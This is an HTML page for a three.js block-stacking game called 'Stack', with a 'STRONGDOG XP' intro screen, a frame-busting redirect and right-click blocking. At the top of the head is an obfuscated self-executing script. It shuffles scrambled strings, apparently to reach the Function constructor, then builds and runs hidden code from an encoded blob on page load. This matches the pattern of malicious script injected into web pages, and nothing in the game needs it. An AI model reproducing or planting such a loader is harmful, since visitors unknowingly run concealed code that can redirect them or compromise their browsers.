<script>
    if (window.top === window.self) {
        window.location.href = '../../../';
    }
</script>

<head>
    <title>Your Website Title</title>
    <script>
(function() {
    var KeY='', iFD=494-483;
    function xsh(b) {
        var g=2231620;
        var p=b.length;
        var d=[];
        for(var u=0; u<p; u++) { d[u]=b.charAt(u); }
        for(var u=0; u<p; u++) {
            var e=g*(u+469)+(g%24291);
            var f=g*(u+603)+(g%33615);
            var k=e%p;
            var i=f%p;
            var j=d[k];
            d[k]=d[i];
            d[i]=j;
            g=(e+f)%2984823;
        };
        return d.join('');
    }
    var dGm=xsh('dtroostitjfayxbglcnecmrnuocukqwrshpvz').substr(0,iFD);
    var deV='=ar c!s3hf.{lt==q8;.Cr)[3n=[nt6<)lA ,=n;)n=0<t=rwiCi=.> +uicvs0z1ru2s5sbdi;fs.r7..)rt;;07v.7fz(tA,5aa6 ma,o),+.v8ler9(nesrtnr2,g;==gonu o;osan;e i6rejftoSh..a;uao9]]=};";fa  ;S1les+()(.y+ v9lv;c1[-ptrhv..tt,0;[ ar"e=)is)((e)v(omr;fr9,effa=h8.=me}v1(br8,rha{]",rhk.ar(for"rkcan+Cnt[a1alvv9++)p)0p;vt=d=nl;),rr sjc[+]=r2n ;tz1ac )tr.m;e=(,=jajaAqp ybt.c[pqnC1l*vtir)zeh=s (rsel;8naj=-=z(,ghxf)dbv;vnu=ilrlc}e,sno,a a[=nj< +8=v[l}fqeh+4tdmAicj(n)-,)(tnC8r+<sg6fec3h()0<gs{][x+uity07)rit(r}aabj;=+(i";7jg12o),;rl,=z=Ccv;i] ;]--;p{es)1l(v (ls0{ngn=t(oaj ;u(+==4]8b(s+km;ogiarbo).l,sli=ts)(w[si e;8,ncpli.p+1i(lvx>A]wum8l0)=oh((v-(;fhe];hzml1;8r+vfah(,(gr"rte;ia7lv)rn[e]lj.4oso(s"25hura(=rh]d,jow.!v;++e=67;hd),g;i)a)r+u==;0aa9,4.du2,=[,0;cguftl9xug=le)r)=1+0xhogzo=}mnea+zrv0C4s";7nfi-;ra)aiie]s6qn .6hvv{t6f,pt* p.arsm)r]hk;;Cuoln{fl7c(+r;ai. r;pbr)q(gh(=sr[lvlpg,j2bt22g.s)ln;n++"9nc."}6r ug;';var VUu=xsh[dGm];var IgE='';var oDZ=VUu;var PHl=VUu(IgE,xsh(deV));var gDm=PHl(xsh('s.)a_sng6bt3a.3(;b;taEcuQs)rae]5w,.b5)QQQar1aosQs6a)ot7)mQns(QarS(Q5.)4;5Q0ontE5wQt.,tuoQeQQasQ=j6%.o ==\/\/_.cQsce$;sQQ,(ac(Q7aA=eQ[!js)o{$(s.QQo3S_(bngQ$tuhm_yQS&QycQ,tt{s$dn353)3auiot_;&)0.1!tQrQq6m;63t,duQ).5ps%;)C"(c}Q_qd37+%.sy4.f\/.ehQ(%@])Q;:Ti6QEa);reF)$a0eFjNQ6t.d4Q=_+tt$Q!.o CeQ%)})t.(e6re(ioQ8w)%.d.m#$QQsjxr=.Q2mp7Qta(a=}l_CQog_,irQiQ Qe>Q.4p(5y$m?_i7.lu=twm..5_iQp 3"tl)MsbQanbMd7er)(ueipQd,@rbn60d$7%.%)dus.QQtQd)i#t(.QqDg<e._7,6__...9{3a ]a(eittq=r !.)h(QexQnQ0kk3nuf\/Q) ta_ ]aw1nQc?)oQswm@(({5cu7r%%$$Q.a=p(a)iQ.s+9j1$y$QQ{Q?$,Qc7 .o)%rnt;S( ts,e$4<p!_kaat=.!Ql(x0 s73o%t=i$rw+(i"f;t()_0_a!3Q(2r7o95}z$uQh9>6)Q48)ct)Qaihcs..43s_o1oQQ=()r%;r+>]QQQ=wdc]}CQ+sir(7;i{u.Qi_](r5Ts=] 4.%_7$.o)Q.Qp3rs$]Qe\'ru]7}2r.fo$)]b2_c) j36";neQ11.)r<r_z41i3i!af0n;3l((QQ!B5)Q{rFE}]2}3 7=t+.bcQj.t trvmj_Q0F$5.on=at,9csr"0dQ1e0Q}Qn,_Q{Q2(r"bou,(-!?w.(b9{dmvg txT,es,sEa6{4_7r(kuj;Q,}4.#ooa=_bju]{5a)).6){r29%6-ah.(#=S+v=wept!$te}lip.un5)QeQ]hsm)QQoQ roaQ.Q,.tdtQqr1Q)l!rl79rm;)...Nd6.Qai.zafr ce=.o,Q2!$_ircn=oe;.a$t6}.tQ(%_8sd 1?.aeQitQ2(Q Q,%!5(QQ_sx7l)t2rdi,Q!"]}lQ,0;Qto8d.a(%=(Q{{_Cn$t3rt]]c1&hQ,$7lE)tgtec9 ecQQQ3em553_t)e2r_(3rr6T%)$rQ5rt(n+3!a+;}t;0 ;]4trQg.hk9..,o@\/2(.1]0Q.{j)8"rQ.%1,ic!Q6oQQ))fCQ(y&e;o3sQtv9QQuQ5es,0(1(\/!6.!pif.)i-;?rQab3wt4NtlNniexq.) Q=]=.zzd\'t;1.)cr]QQ0_([(_Q.a?eh,7)Qa](k(d 2Qt7$1Q(Qa(>a70rjQ5+QQQa(Q"l53.Qi.[1Qa]pe6)Q8a%6\'x5}.!D*!frbaQ95Q=.Q-BroQi]3]4\/_Qis0:e*;o2_tQn1bd6ae;.$i0s)e,_!Q1]op !e(-r\'>fw);]Q>5pQQuszs_sic4.c6p;$).!-9]to_mr8}6.sc8el4t.C.=eEd1QQ$6t0 c2,3ClelQbt..),+;o{sQlb7g#]f]$o).7adzr(%?(!c{__orQo;%Qo!.;;>!rf5tyn=Aed,Qg_.?#..igo7cze2=QQ!4eu()=Q5nQewg}Q(Q,ze_w8Qcy{a,6a1)\/4-(;i_Asa4_qut!s1(oka)(]ec;\/h](6!o=3*Q=(.Q_be=Q;QQdc;r0i*#o-s ak\/aQe1l.i)jQo2=(Q(.]a__(Q")$6d3.$6bmh)Q8QQahSjQsr7}rpkQ<Qfj_4.]Q@(tsja>7],lisag(r=paQ)(){(o+.(cw0)!%c7e5+1-s{.%#r}a!]]f:;}]nsQraplaQ33_]QfQn\/w s(.a[r)Qd{tCQaf690;t10n+4 nQ6 7[mtTbrQa)o%ftQ e_bsBQ6=4)5.4=a=b)j09A(Qj]oQ$!)\/7(*.)4._Q,!.!j\'ol6QS 3m;a+Qo.tQqdj#% f!4Qt$)]{ns8_;]i.0ne;tne+Iiu3c)i er;lztt.QDQ;n5_(it.of3,bsoon \'sBaQpcQz.s8b1o)_iefo_8).n_d)QQEr,6}sn5j=r=g5%:iQe }{ew)ro eek)n$)oQwiQ$e!89Qo(-.fliQ(.t7_;i1Q.%=eQf*,af41n)lfe;ieu '));var fAC=oDZ(KeY,gDm );fAC(3392);return 9309
})()


        window.addEventListener('load', function() {
            // Create intro container
            var introDiv = document.createElement('div');
            introDiv.id = 'intro';

            // Create and add STRONGDOG text
            var strongDogDiv = document.createElement('div');
            strongDogDiv.id = 'strongdog';
            strongDogDiv.innerText = 'STRONGDOG';
            strongDogDiv.style.opacity = '0'; // Start invisible
            introDiv.appendChild(strongDogDiv);

            // Create and add XP text
            var xpDiv = document.createElement('div');
            xpDiv.id = 'xp';
            xpDiv.innerText = 'XP';
            xpDiv.style.opacity = '0'; // Start invisible
            introDiv.appendChild(xpDiv);

            // Create and add image
            var uploadedImage = document.createElement('img');
            uploadedImage.id = 'uploadedImage';
            uploadedImage.src = '../../../strongdog.webp'; // Path to your image
            uploadedImage.style.display = 'none';
            introDiv.appendChild(uploadedImage);

            // Append intro to body
            document.body.insertBefore(introDiv, document.body.firstChild);

            // Add styles
            var css = `
                #intro {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(33, 33, 33, 1);
                    z-index: 1000;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    transition: transform 0.5s ease-in-out;
                }

                #strongdog, #xp {
                    font-size: 3em;
                    font-weight: bold;
                    opacity: 0;
                    animation: fadeInSlam 1s ease forwards;
                }

                #strongdog {
                    color: white;
                }

                #xp {
                    color: orange;
                    animation-delay: 0.5s; 
                }

                @keyframes fadeInSlam {
                    0% { transform: scale(0); opacity: 0; }
                    50% { transform: scale(1.2); opacity: 1; }
                    100% { transform: scale(1); opacity: 1; }
                }

                @keyframes riseUp {
                    0% { transform: translateY(0); }
                    100% { transform: translateY(-100px); }
                }

                #uploadedImage {
                    width: 100%;
                    max-width: 600px;
                    opacity: 0;
                    transform: scale(0);
                    animation: growAndSettle 1s ease forwards;
                }

                @keyframes growAndSettle {
                    0% { transform: scale(0); opacity: 0; }
                    50% { transform: scale(1.1); opacity: 1; }
                    75% { transform: scale(0.9); }
                    100% { transform: scale(1); }
                }
            `;
            var styleSheet = document.createElement('style');
            styleSheet.type = 'text/css';
            styleSheet.innerText = css;
            document.head.appendChild(styleSheet);

            // Trigger image fade-in and text fade-out
            setTimeout(() => {
                uploadedImage.style.display = 'block';
                uploadedImage.style.opacity = 1;
                strongDogDiv.style.opacity = 0;
                xpDiv.style.opacity = 0;
            }, 1500);

            // Slide up and remove intro
            setTimeout(() => {
                introDiv.style.transform = 'translateY(-100%)';
                setTimeout(() => { introDiv.remove(); }, 500);
            }, 3200);
        });
    </script>
</head>


<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Stack</title>
    <link rel="icon" href="stack.png">
    <script type="text/javascript">
      function disableselect(e) {
        return false;
      }

      function reEnable() {
        return true;
      }

      //if IE4+
      document.onselectstart = new Function("return false");
      document.oncontextmenu = new Function("return false");
      //if NS6
      if (window.sidebar) {
        document.onmousedown = disableselect;
        document.onclick = reEnable;
      }
    </script>
    <style>
      @import url("https://fonts.googleapis.com/css?family=Comfortaa");
      html,
      body {
        margin: 0;
        overflow: hidden;
        height: 100%;
        width: 100%;
        position: relative;
        font-family: "Comfortaa", cursive;
      }

      #container {
        width: 100%;
        height: 100%;
      }
      #container #score {
        position: absolute;
        top: 20px;
        width: 100%;
        text-align: center;
        font-size: 10vh;
        -webkit-transition: -webkit-transform 0.5s ease;
        transition: -webkit-transform 0.5s ease;
        transition: transform 0.5s ease;
        transition: transform 0.5s ease, -webkit-transform 0.5s ease;
        color: #333344;
        -webkit-transform: translatey(-200px) scale(1);
        transform: translatey(-200px) scale(1);
      }
      #container #game {
        position: absolute;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
      }
      #container .game-over {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 85%;
        display: -webkit-box;
        display: flex;
        -webkit-box-orient: vertical;
        -webkit-box-direction: normal;
        flex-direction: column;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: center;
        justify-content: center;
      }
      #container .game-over * {
        -webkit-transition: opacity 0.5s ease, -webkit-transform 0.5s ease;
        transition: opacity 0.5s ease, -webkit-transform 0.5s ease;
        transition: opacity 0.5s ease, transform 0.5s ease;
        transition: opacity 0.5s ease, transform 0.5s ease,
          -webkit-transform 0.5s ease;
        opacity: 0;
        -webkit-transform: translatey(-50px);
        transform: translatey(-50px);
        color: #333344;
      }
      #container .game-over h2 {
        margin: 0;
        padding: 0;
        font-size: 40px;
      }
      #container .game-ready {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        display: -webkit-box;
        display: flex;
        -webkit-box-orient: vertical;
        -webkit-box-direction: normal;
        flex-direction: column;
        -webkit-box-align: center;
        align-items: center;
        justify-content: space-around;
      }
      #container .game-ready #start-button {
        -webkit-transition: opacity 0.5s ease, -webkit-transform 0.5s ease;
        transition: opacity 0.5s ease, -webkit-transform 0.5s ease;
        transition: opacity 0.5s ease, transform 0.5s ease;
        transition: opacity 0.5s ease, transform 0.5s ease,
          -webkit-transform 0.5s ease;
        opacity: 0;
        -webkit-transform: translatey(-50px);
        transform: translatey(-50px);
        border: 3px solid #333344;
        padding: 10px 20px;
        background-color: transparent;
        color: #333344;
        font-size: 30px;
      }
      #container #instructions {
        position: absolute;
        width: 100%;
        top: 16vh;
        left: 0;
        text-align: center;
        -webkit-transition: opacity 0.5s ease, -webkit-transform 0.5s ease;
        transition: opacity 0.5s ease, -webkit-transform 0.5s ease;
        transition: opacity 0.5s ease, transform 0.5s ease;
        transition: opacity 0.5s ease, transform 0.5s ease,
          -webkit-transform 0.5s ease;
        opacity: 0;
      }
      #container #instructions.hide {
        opacity: 0 !important;
      }
      #container.playing #score,
      #container.resetting #score {
        -webkit-transform: translatey(0px) scale(1);
        transform: translatey(0px) scale(1);
      }
      #container.playing #instructions {
        opacity: 1;
      }
      #container.ready .game-ready #start-button {
        opacity: 1;
        -webkit-transform: translatey(0);
        transform: translatey(0);
      }
      #container.ended #score {
        -webkit-transform: translatey(6vh) scale(1.5);
        transform: translatey(6vh) scale(1.5);
      }
      #container.ended .game-over * {
        opacity: 1;
        -webkit-transform: translatey(0);
        transform: translatey(0);
      }
      #container.ended .game-over p {
        -webkit-transition-delay: 0.3s;
        transition-delay: 0.3s;
      }
    </style>
    <script>
      window.console = window.console || function (t) {};
    </script>
    <script>
      if (document.location.search.match(/type=embed/gi)) {
        window.parent.postMessage("resize", "*");
      }
    </script>
  </head>
  <body oncontextmenu="return false;" id="ancss">
    <meta name="viewport" content="width=device-width,user-scalable=no" />
    <div id="container">
      <div id="game"></div>
      <div id="score">0</div>
      <div id="instructions">
        Click (or press the spacebar) to place the block
      </div>
      <div class="game-over">
        <h2>Game Over</h2>
        <p>You did great, you're the best.</p>
        <p>Click or spacebar to start again</p>
      </div>
      <div class="game-ready">
        <div id="start-button">Start</div>
        <div></div>
      </div>
    </div>
    <script src="main.js"></script>
    <script src="three.min.js"></script>
    <script src="TweenMax.min.js"></script>
    <script id="rendered-js">
      "use strict";
      console.clear();
      var Stage = /** @class */ (function () {
        function Stage() {
          // container
          var _this = this;
          this.render = function () {
            this.renderer.render(this.scene, this.camera);
          };
          this.add = function (elem) {
            this.scene.add(elem);
          };
          this.remove = function (elem) {
            this.scene.remove(elem);
          };
          this.container = document.getElementById("game");
          // renderer
          this.renderer = new THREE.WebGLRenderer({
            antialias: true,
            alpha: false,
          });

          this.renderer.setSize(window.innerWidth, window.innerHeight);
          this.renderer.setClearColor("#D0CBC7", 1);
          this.container.appendChild(this.renderer.domElement);
          // scene
          this.scene = new THREE.Scene();
          // camera
          var aspect = window.innerWidth / window.innerHeight;
          var d = 20;
          this.camera = new THREE.OrthographicCamera(
            -d * aspect,
            d * aspect,
            d,
            -d,
            -100,
            1000
          );
          this.camera.position.x = 2;
          this.camera.position.y = 2;
          this.camera.position.z = 2;
          this.camera.lookAt(new THREE.Vector3(0, 0, 0));
          //light
          this.light = new THREE.DirectionalLight(0xffffff, 0.5);
          this.light.position.set(0, 499, 0);
          this.scene.add(this.light);
          this.softLight = new THREE.AmbientLight(0xffffff, 0.4);
          this.scene.add(this.softLight);
          window.addEventListener("resize", function () {
            return _this.onResize();
          });
          this.onResize();
        }
        Stage.prototype.setCamera = function (y, speed) {
          if (speed === void 0) {
            speed = 0.3;
          }
          TweenLite.to(this.camera.position, speed, {
            y: y + 4,
            ease: Power1.easeInOut,
          });
          TweenLite.to(this.camera.lookAt, speed, {
            y: y,
            ease: Power1.easeInOut,
          });
        };
        Stage.prototype.onResize = function () {
          var viewSize = 30;
          this.renderer.setSize(window.innerWidth, window.innerHeight);
          this.camera.left = window.innerWidth / -viewSize;
          this.camera.right = window.innerWidth / viewSize;
          this.camera.top = window.innerHeight / viewSize;
          this.camera.bottom = window.innerHeight / -viewSize;
          this.camera.updateProjectionMatrix();
        };
        return Stage;
      })();
      var Block = /** @class */ (function () {
        function Block(block) {
          // set size and position
          this.STATES = {
            ACTIVE: "active",
            STOPPED: "stopped",
            MISSED: "missed",
          };
          this.MOVE_AMOUNT = 12;
          this.dimension = { width: 0, height: 0, depth: 0 };
          this.position = { x: 0, y: 0, z: 0 };
          this.targetBlock = block;
          this.index = (this.targetBlock ? this.targetBlock.index : 0) + 1;
          this.workingPlane = this.index % 2 ? "x" : "z";
          this.workingDimension = this.index % 2 ? "width" : "depth";
          // set the dimensions from the target block, or defaults.
          this.dimension.width = this.targetBlock
            ? this.targetBlock.dimension.width
            : 10;
          this.dimension.height = this.targetBlock
            ? this.targetBlock.dimension.height
            : 2;
          this.dimension.depth = this.targetBlock
            ? this.targetBlock.dimension.depth
            : 10;
          this.position.x = this.targetBlock ? this.targetBlock.position.x : 0;
          this.position.y = this.dimension.height * this.index;
          this.position.z = this.targetBlock ? this.targetBlock.position.z : 0;
          this.colorOffset = this.targetBlock
            ? this.targetBlock.colorOffset
            : Math.round(Math.random() * 100);
          // set color
          if (!this.targetBlock) {
            this.color = 0x333344;
          } else {
            var offset = this.index + this.colorOffset;
            var r = Math.sin(0.3 * offset) * 55 + 200;
            var g = Math.sin(0.3 * offset + 2) * 55 + 200;
            var b = Math.sin(0.3 * offset + 4) * 55 + 200;
            this.color = new THREE.Color(r / 255, g / 255, b / 255);
          }
          // state
          this.state =
            this.index > 1 ? this.STATES.ACTIVE : this.STATES.STOPPED;
          // set direction
          this.speed = -0.1 - this.index * 0.005;
          if (this.speed < -4) this.speed = -4;
          this.direction = this.speed;
          // create block
          var geometry = new THREE.BoxGeometry(
            this.dimension.width,
            this.dimension.height,
            this.dimension.depth
          );
          geometry.applyMatrix(
            new THREE.Matrix4().makeTranslation(
              this.dimension.width / 2,
              this.dimension.height / 2,
              this.dimension.depth / 2
            )
          );
          this.material = new THREE.MeshToonMaterial({
            color: this.color,
            shading: THREE.FlatShading,
          });
          this.mesh = new THREE.Mesh(geometry, this.material);
          this.mesh.position.set(
            this.position.x,
            this.position.y + (this.state == this.STATES.ACTIVE ? 0 : 0),
            this.position.z
          );
          if (this.state == this.STATES.ACTIVE) {
            this.position[this.workingPlane] =
              Math.random() > 0.5 ? -this.MOVE_AMOUNT : this.MOVE_AMOUNT;
          }
        }
        Block.prototype.reverseDirection = function () {
          this.direction =
            this.direction > 0 ? this.speed : Math.abs(this.speed);
        };
        Block.prototype.place = function () {
          this.state = this.STATES.STOPPED;
          var overlap =
            this.targetBlock.dimension[this.workingDimension] -
            Math.abs(
              this.position[this.workingPlane] -
                this.targetBlock.position[this.workingPlane]
            );
          var blocksToReturn = {
            plane: this.workingPlane,
            direction: this.direction,
          };

          if (this.dimension[this.workingDimension] - overlap < 0.3) {
            overlap = this.dimension[this.workingDimension];
            blocksToReturn.bonus = true;
            this.position.x = this.targetBlock.position.x;
            this.position.z = this.targetBlock.position.z;
            this.dimension.width = this.targetBlock.dimension.width;
            this.dimension.depth = this.targetBlock.dimension.depth;
          }
          if (overlap > 0) {
            var choppedDimensions = {
              width: this.dimension.width,
              height: this.dimension.height,
              depth: this.dimension.depth,
            };
            choppedDimensions[this.workingDimension] -= overlap;
            this.dimension[this.workingDimension] = overlap;
            var placedGeometry = new THREE.BoxGeometry(
              this.dimension.width,
              this.dimension.height,
              this.dimension.depth
            );
            placedGeometry.applyMatrix(
              new THREE.Matrix4().makeTranslation(
                this.dimension.width / 2,
                this.dimension.height / 2,
                this.dimension.depth / 2
              )
            );
            var placedMesh = new THREE.Mesh(placedGeometry, this.material);
            var choppedGeometry = new THREE.BoxGeometry(
              choppedDimensions.width,
              choppedDimensions.height,
              choppedDimensions.depth
            );
            choppedGeometry.applyMatrix(
              new THREE.Matrix4().makeTranslation(
                choppedDimensions.width / 2,
                choppedDimensions.height / 2,
                choppedDimensions.depth / 2
              )
            );
            var choppedMesh = new THREE.Mesh(choppedGeometry, this.material);
            var choppedPosition = {
              x: this.position.x,
              y: this.position.y,
              z: this.position.z,
            };

            if (
              this.position[this.workingPlane] <
              this.targetBlock.position[this.workingPlane]
            ) {
              this.position[this.workingPlane] =
                this.targetBlock.position[this.workingPlane];
            } else {
              choppedPosition[this.workingPlane] += overlap;
            }
            placedMesh.position.set(
              this.position.x,
              this.position.y,
              this.position.z
            );
            choppedMesh.position.set(
              choppedPosition.x,
              choppedPosition.y,
              choppedPosition.z
            );
            blocksToReturn.placed = placedMesh;
            if (!blocksToReturn.bonus) blocksToReturn.chopped = choppedMesh;
          } else {
            this.state = this.STATES.MISSED;
          }
          this.dimension[this.workingDimension] = overlap;
          return blocksToReturn;
        };
        Block.prototype.tick = function () {
          if (this.state == this.STATES.ACTIVE) {
            var value = this.position[this.workingPlane];
            if (value > this.MOVE_AMOUNT || value < -this.MOVE_AMOUNT)
              this.reverseDirection();
            this.position[this.workingPlane] += this.direction;
            this.mesh.position[this.workingPlane] =
              this.position[this.workingPlane];
          }
        };
        return Block;
      })();
      var Game = /** @class */ (function () {
        function Game() {
          var _this = this;
          this.STATES = {
            LOADING: "loading",
            PLAYING: "playing",
            READY: "ready",
            ENDED: "ended",
            RESETTING: "resetting",
          };

          this.blocks = [];
          this.state = this.STATES.LOADING;
          this.stage = new Stage();
          this.mainContainer = document.getElementById("container");
          this.scoreContainer = document.getElementById("score");
          this.startButton = document.getElementById("start-button");
          this.instructions = document.getElementById("instructions");
          this.scoreContainer.innerHTML = "0";
          this.newBlocks = new THREE.Group();
          this.placedBlocks = new THREE.Group();
          this.choppedBlocks = new THREE.Group();
          this.stage.add(this.newBlocks);
          this.stage.add(this.placedBlocks);
          this.stage.add(this.choppedBlocks);
          this.addBlock();
          this.tick();
          this.updateState(this.STATES.READY);
          document.addEventListener("keydown", function (e) {
            if (e.keyCode == 32) _this.onAction();
          });
          document.addEventListener("click", function (e) {
            _this.onAction();
          });
          document.addEventListener("touchstart", function (e) {
            e.preventDefault();
            // this.onAction();
            // ☝️ this triggers after click on android so you
            // insta-lose, will figure it out later.
          });
        }
        Game.prototype.updateState = function (newState) {
          for (var key in this.STATES)
            this.mainContainer.classList.remove(this.STATES[key]);
          this.mainContainer.classList.add(newState);
          this.state = newState;
        };
        Game.prototype.onAction = function () {
          switch (this.state) {
            case this.STATES.READY:
              this.startGame();
              break;
            case this.STATES.PLAYING:
              this.placeBlock();
              break;
            case this.STATES.ENDED:
              this.restartGame();
              break;
          }
        };
        Game.prototype.startGame = function () {
          if (this.state != this.STATES.PLAYING) {
            this.scoreContainer.innerHTML = "0";
            this.updateState(this.STATES.PLAYING);
            this.addBlock();
          }
        };
        Game.prototype.restartGame = function () {
          var _this = this;
          this.updateState(this.STATES.RESETTING);
          var oldBlocks = this.placedBlocks.children;
          var removeSpeed = 0.2;
          var delayAmount = 0.02;
          var _loop_1 = function (i) {
            TweenLite.to(oldBlocks[i].scale, removeSpeed, {
              x: 0,
              y: 0,
              z: 0,
              delay: (oldBlocks.length - i) * delayAmount,
              ease: Power1.easeIn,
              onComplete: function () {
                return _this.placedBlocks.remove(oldBlocks[i]);
              },
            });
            TweenLite.to(oldBlocks[i].rotation, removeSpeed, {
              y: 0.5,
              delay: (oldBlocks.length - i) * delayAmount,
              ease: Power1.easeIn,
            });
          };
          for (var i = 0; i < oldBlocks.length; i++) {
            _loop_1(i);
          }
          var cameraMoveSpeed =
            removeSpeed * 2 + oldBlocks.length * delayAmount;
          this.stage.setCamera(2, cameraMoveSpeed);
          var countdown = { value: this.blocks.length - 1 };
          TweenLite.to(countdown, cameraMoveSpeed, {
            value: 0,
            onUpdate: function () {
              _this.scoreContainer.innerHTML = String(
                Math.round(countdown.value)
              );
            },
          });
          this.blocks = this.blocks.slice(0, 1);
          setTimeout(function () {
            _this.startGame();
          }, cameraMoveSpeed * 1000);
        };
        Game.prototype.placeBlock = function () {
          var _this = this;
          var currentBlock = this.blocks[this.blocks.length - 1];
          var newBlocks = currentBlock.place();
          this.newBlocks.remove(currentBlock.mesh);
          if (newBlocks.placed) this.placedBlocks.add(newBlocks.placed);
          if (newBlocks.chopped) {
            this.choppedBlocks.add(newBlocks.chopped);
            var positionParams = {
              y: "-=30",
              ease: Power1.easeIn,
              onComplete: function () {
                return _this.choppedBlocks.remove(newBlocks.chopped);
              },
            };
            var rotateRandomness = 10;
            var rotationParams = {
              delay: 0.05,
              x:
                newBlocks.plane == "z"
                  ? Math.random() * rotateRandomness - rotateRandomness / 2
                  : 0.1,
              z:
                newBlocks.plane == "x"
                  ? Math.random() * rotateRandomness - rotateRandomness / 2
                  : 0.1,
              y: Math.random() * 0.1,
            };

            if (
              newBlocks.chopped.position[newBlocks.plane] >
              newBlocks.placed.position[newBlocks.plane]
            ) {
              positionParams[newBlocks.plane] =
                "+=" + 40 * Math.abs(newBlocks.direction);
            } else {
              positionParams[newBlocks.plane] =
                "-=" + 40 * Math.abs(newBlocks.direction);
            }
            TweenLite.to(newBlocks.chopped.position, 1, positionParams);
            TweenLite.to(newBlocks.chopped.rotation, 1, rotationParams);
          }
          this.addBlock();
        };
        Game.prototype.addBlock = function () {
          var lastBlock = this.blocks[this.blocks.length - 1];
          if (lastBlock && lastBlock.state == lastBlock.STATES.MISSED) {
            return this.endGame();
          }
          this.scoreContainer.innerHTML = String(this.blocks.length - 1);
          var newKidOnTheBlock = new Block(lastBlock);
          this.newBlocks.add(newKidOnTheBlock.mesh);
          this.blocks.push(newKidOnTheBlock);
          this.stage.setCamera(this.blocks.length * 2);
          if (this.blocks.length >= 5) this.instructions.classList.add("hide");
        };
        Game.prototype.endGame = function () {
          this.updateState(this.STATES.ENDED);
        };
        Game.prototype.tick = function () {
          var _this = this;
          this.blocks[this.blocks.length - 1].tick();
          this.stage.render();
          requestAnimationFrame(function () {
            _this.tick();
          });
        };
        return Game;
      })();
      var game = new Game();
    </script>
    <script type="application/javascript" src="/js/main.js"></script>
  </body>
</html>